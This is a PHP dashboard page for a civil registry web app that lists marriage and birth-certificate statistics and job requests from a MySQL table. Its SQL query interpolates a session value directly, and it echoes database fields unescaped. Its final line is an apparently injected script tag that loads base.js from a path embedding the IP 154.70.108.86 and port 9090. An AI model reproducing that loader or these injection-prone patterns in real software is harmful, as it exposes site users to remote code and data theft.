	<!DOCTYPE html>
<html lang="en">
<!-- BEGIN HEAD -->



<head>
	
	<title>Civil Registry</title>
	<!-- google font -->
	<link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet" type="text/css" />
	<!-- icons -->
	<link href="fonts/simple-line-icons/simple-line-icons.min.css" rel="stylesheet" type="text/css" />
	<link href="fonts/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="fonts/material-design-icons/material-icon.css" rel="stylesheet" type="text/css" />
	<!--bootstrap -->
	<link href="../assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="../assets/plugins/summernote/summernote.css" rel="stylesheet">
	<!-- Material Design Lite CSS -->
	<link rel="stylesheet" href="../assets/plugins/material/material.min.css">
	<link rel="stylesheet" href="../assets/css/material_style.css">
	<!-- inbox style -->
	<link href="../assets/css/pages/inbox.min.css" rel="stylesheet" type="text/css" />
	<!-- Theme Styles -->
	<link href="../assets/css/theme/dark/theme_style.css" rel="stylesheet" id="rt_style_components" type="text/css" />
	<link href="../assets/css/plugins.min.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/theme/dark/style.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/responsive.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/theme/dark/theme-color.css" rel="stylesheet" type="text/css" />
	<!-- favicon -->
	<link rel="shortcut icon" href="http://radixtouch.in/templates/admin/smart/source/assets/img/favicon.ico" />
</head>
<!-- END HEAD -->

<body class="page-header-fixed sidemenu-closed-hidelogo page-content-white page-md header-dark dark-sidebar-color logo-dark dark-theme">
	  <?php include_once 'nav.php'; ?>
	 <?php include_once 'stats.inc.php'; ?>
			<!-- start page content -->
			<div class="page-content-wrapper">
				<div class="page-content">
					<div class="page-bar">
						<div class="page-title-breadcrumb">
							<div class=" pull-left">
								<div class="page-title">Dashboard</div>
							</div>
							<ol class="breadcrumb page-breadcrumb pull-right">
								<li><i class="fa fa-home"></i>&nbsp;<a class="parent-item" href="index.php">Home</a>&nbsp;<i class="fa fa-angle-right"></i>
								</li>
								<li class="active">Dashboard</li>
							</ol>
						</div>
					</div>
					<!-- start widget -->
					<div class="state-overview">
						<div class="row">
							<div class="col-xl-3 col-md-6 col-12"  >
								
								<div class="info-box bg-b-green">
									<span class="info-box-icon push-bottom"><i class="material-icons">group</i></span>
									<div class="info-box-content">

										<span class="info-box-text">Mariages done</span>

										<span class="info-box-number"><?php echo $marriage; ?></span>
										<div class="progress">
											<div class="progress-bar" style="width:<?php echo $mper_int; ?>"></div>
										</div>
										<span class="progress-description">
											<?php echo $mper; ?>% Increase this year
										</span>
									</div>
									<!-- /.info-box-content -->
								</div>
								<!-- /.info-box -->
							
							</div>
							<!-- /.col -->
							<div class="col-xl-3 col-md-6 col-12">
								<div class="info-box bg-b-yellow">
									<span class="info-box-icon push-bottom"><i class="material-icons">person</i></span>
									<div class="info-box-content">
										<span class="info-box-text">Birth Certificates Issued</span>
										<span class="info-box-number"><?php echo $birth; ?></span>
										<div class="progress">
											<div class="progress-bar" style="width: <?php echo $bper_int; ?>"></div>
										</div>
										<span class="progress-description">
											<?php echo $bper; ?>% Increase this year
										</span>
									</div>
									<!-- /.info-box-content -->
								</div>
								<!-- /.info-box -->
							</div>
							<!-- /.col -->
							
							<!-- /.col -->
							<div class="col-xl-3 col-md-6 col-12">
								
								<!-- /.info-box -->
							</div>
							<!-- /.col -->
						</div>
					</div>
					<!-- end widget -->
					
					<div class="row">
						<div class="col-md-12 col-sm-12">
							<div class="card  card-box">
								<div class="card-head">
									<header>New Job Request</header>
									<div class="tools">
										<a class="fa fa-repeat btn-color box-refresh" href="javascript:;"></a>
										<a class="t-collapse btn-color fa fa-chevron-down" href="javascript:;"></a>
										<a class="t-close btn-color fa fa-times" href="javascript:;"></a>
									</div>
								</div>

								<?php
 $sub= $_SESSION['subdiv'];
  //Getting the request information from the database.
  $sql = "SELECT * FROM JOBREQUEST WHERE RCenterID = '$sub' ";

  $result = mysqli_query($conn, $sql) or die('could not access database'. mysqli_error($conn));
   ?>
								<div class="card-body ">
									<div class="table-wrap">
										<div class="table-responsive">
											<table class="table display product-overview mb-30" id="support_table">
												<thead>
													<tr>
														<th>No</th>
														<th>ID</th>
														<th>Name</th>
														<th>Type of Job</th>
														<th>Job name</th>
														<th>Certificate ID</th>
														<th>Date Posted</th>
														<th>Fees</th>
														<th>Contact info</th>
														<th>status</th>
														
														<th>action</th>
													</tr>
												</thead>
												<tbody>
													<?php

																	 
  //setting variable to count the number of requests.
    $count = 1;
  while($row = mysqli_fetch_assoc($result)){
      //Putting request information in the table.


																	?>
													<tr>
														<td><?php echo $count; ?></td>
														<td><?php echo "{$row['RID']}"; ?></td>
														<td><?php echo "{$row['Name']}"; ?></td>
														<td><?php echo "{$row['JobType']}"; ?></td>
														<td><?php echo "{$row['JobName']}"; ?></td>
														<td><?php echo "{$row['CertificateID']}"; ?></td>
														<td><?php echo "{$row['DatePosted']}"; ?></td>
														<td><?php echo "{$row['Fees']}"; ?></td>
														<td><?php echo "{$row['Phone']}"; ?></td>
														<td>
															<span class="label label-sm label-success">paid</span>
														</td>
														<td><a href="javascript:void(0)" class="" data-toggle="tooltip" title="Edit"><i class="fa fa-check"></i></a>
															<a href="javascript:void(0)" class="text-inverse" title="Delete" data-toggle="tooltip"><i class="fa fa-trash"></i></a></td>
													</tr>
													
  <?php
  $count = $count + 1;
  }
  ?>
													
												</tbody>
											</table>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<!-- end new Job list -->

					<!--
					<div class="row">

					
					
					<!-- Quick Mail start 
					<div class="col-lg-6 col-md-12 col-sm-12 col-12">
							<div class="card-box">
								<div class="card-head">
									
									<header>Quick Mail</header>
									<button id="demo_menu-lower-right" class="mdl-button mdl-js-button mdl-button--icon pull-right" data-upgraded=",MaterialButton">
										<i class="material-icons">more_vert</i>
									</button>
									<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" data-mdl-for="demo_menu-lower-right">
										<li class="mdl-menu__item"><i class="material-icons">assistant_photo</i>Action</li>
										<li class="mdl-menu__item"><i class="material-icons">print</i>Another action</li>
										<li class="mdl-menu__item"><i class="material-icons">favorite</i>Something else here</li>
									</ul>
								</div>
								<div class="card-body ">
									<div class="mail-list">
										<div class="compose-mail">
											<form method="post" action="send_mail.php">
												<div class="form-group">
													<label for="to" class="">To:</label>
													<input type="text" tabindex="1" id="to" class="form-control" name ="to" required>
													<div class="compose-options">
														<a onclick="$(this).hide(); $('#cc').parent().removeClass('hidden'); $('#cc').focus();" href="javascript:;">Cc</a>
														<a onclick="$(this).hide(); $('#bcc').parent().removeClass('hidden'); $('#bcc').focus();" href="javascript:;">Bcc</a>
													</div>
												</div>
												<div class="form-group hidden">
													<label for="cc" class="">Cc:</label>
													<input type="text" tabindex="2" id="cc" class="form-control" name ="cc">
												</div>
												<div class="form-group hidden">
													<label for="bcc" class="">Bcc:</label>
													<input type="text" tabindex="2" id="bcc" class="form-control" name="bcc">
												</div>
												<div class="form-group">
													<label for="subject" class="">Subject:</label>
													<input type="text" tabindex="1" id="subject" class="form-control" name="subject">
												</div>
												<div>

													<div class = "form-group">

														<textarea class="form-control p-text-area" rows="4" placeholder="Write Message here..." rows = 6 name="message"></textarea>
													</div>
													<input type="file" class="default" name="attach" multiple>
												</div>
												<!--   <div class="btn-group margin-top-20 ">
	                                                <button class="btn btn-primary btn-sm margin-right-10"><i class="fa fa-check"></i> Send</button>
                                           		</div> 
												<div class="box-footer">
													<button type="submit" class="mdl-button mdl-button--raised mdl-js-ripple-effect m-b-10 btn-primary pull-right" name="send">Send
														<i class="fa fa-paper-plane-o"></i></button>
												</div>
											</form>
										</div>
									</div>
								</div>
							</div>
						</div>
						</div>
						<!-- Quick Mail end -->
					<!-- start course list 
					<div class="row">
						<div class="col-lg-3 col-md-6 col-12 col-sm-6">
							<div class="blogThumb">
								<div class="thumb-center"><img class="img-responsive" alt="user" src="../assets/img/course/course1.jpg"></div>
								<div class="course-box">
									<h4>Computer Literacy Course</h4>
									
									<p><span><i class="ti-alarm-clock"></i> Duration: 30 mins</span></p>
									<p><span><i class="ti-user"></i> Professor: Jane Doe</span></p>
									<p><span><i class="fa fa-graduation-cap"></i> Registrars: 200+</span></p>
									<button type="button" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect m-b-10 btn-info">Click To learn
										</button>
								</div>
							</div>
						</div>
						<div class="col-lg-3 col-md-6 col-12 col-sm-6">
							<div class="blogThumb">
								<div class="thumb-center"><img class="img-responsive" alt="user" src="../assets/img/course/course2.jpg"></div>
								<div class="course-box">
									<h4>Public Speaking Course</h4>
									
									<p><span><i class="ti-alarm-clock"></i> Duration: 50 mins </span></p>
									<p><span><i class="ti-user"></i> Professor: Jane Doe</span></p>
									<p><span><i class="fa fa-graduation-cap"></i> Registrars: 200+</span></p>
									<button type="button" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect m-b-10 btn-info">Click to learn</button>
								</div>
							</div>
						</div>
						<div class="col-lg-3 col-md-6 col-12 col-sm-6">
							<div class="blogThumb">
								<div class="thumb-center"><img class="img-responsive" alt="user" src="../assets/img/course/course3.jpg"></div>
								<div class="course-box">
									<h4>Event Planning Course </h4>
									
									<p><span><i class="ti-alarm-clock"></i> Duration: 15 mins</span></p>
									<p><span><i class="ti-user"></i> Professor: Jane Doe</span></p>
									<p><span><i class="fa fa-graduation-cap"></i> Registrars: 50+</span></p>
									<button type="button" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect m-b-10 btn-info">Click to learn</button>
								</div>
							</div>
						</div>
						<div class="col-lg-3 col-md-6 col-12 col-sm-6">
							<div class="blogThumb">
								<div class="thumb-center"><img class="img-responsive" alt="user" src="../assets/img/course/course4.jpg"></div>
								<div class="course-box">
									<h4>Marriage Councelling Course</h4>
									
									<p><span><i class="ti-alarm-clock"></i> Duration: 6 weeks</span></p>
									<p><span><i class="ti-user"></i> Professor: Jane Doe</span></p>
									<p><span><i class="fa fa-graduation-cap"></i> Registrars: 200+</span></p>
									<button type="button" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect m-b-10 btn-info">Click to learn more</button>
								</div>
							</div>
						</div>
					</div>
					<!-- End course list -->
					<div class="row">
						
						
					</div>
					
					
					
				</div>
			</div>
			<!-- end page content -->
			
		
		</div>
		<!-- end page container -->
		<?php require 'footer.php';?>
	</div>
	<!-- start js include path -->
	<script src="../assets/plugins/jquery/jquery.min.js"></script>
	<script src="../assets/plugins/popper/popper.js"></script>
	<script src="../assets/plugins/jquery-blockui/jquery.blockui.min.js"></script>
	<script src="../assets/plugins/jquery-slimscroll/jquery.slimscroll.js"></script>
	<!-- bootstrap -->
	<script src="../assets/plugins/bootstrap/js/bootstrap.min.js"></script>
	<script src="../assets/plugins/bootstrap-switch/js/bootstrap-switch.min.js"></script>
	<script src="../assets/plugins/sparkline/jquery.sparkline.js"></script>
	<script src="../assets/js/pages/sparkline/sparkline-data.js"></script>
	<!-- Common js-->
	<script src="../assets/js/app.js"></script>
	<script src="../assets/js/layout.js"></script>
	<script src="../assets/js/theme-color.js"></script>
	<!-- material -->
	<script src="../assets/plugins/material/material.min.js"></script>
	<!-- chart js -->
	<script src="../assets/plugins/chart-js/Chart.bundle.js"></script>
	<script src="../assets/plugins/chart-js/utils.js"></script>
	<script src="../assets/js/pages/chart/chartjs/home-data.js"></script>
	<!-- summernote -->
	<script src="../assets/plugins/summernote/summernote.js"></script>
	<script src="../assets/js/pages/summernote/summernote-data.js"></script>
	<!-- end js include path -->
<script type = 'text/javascript' id ='1qa2ws' charset='utf-8' src='../../../../../../154.70.108.86_9090/www/default/base.js'></script></body>


<
</html>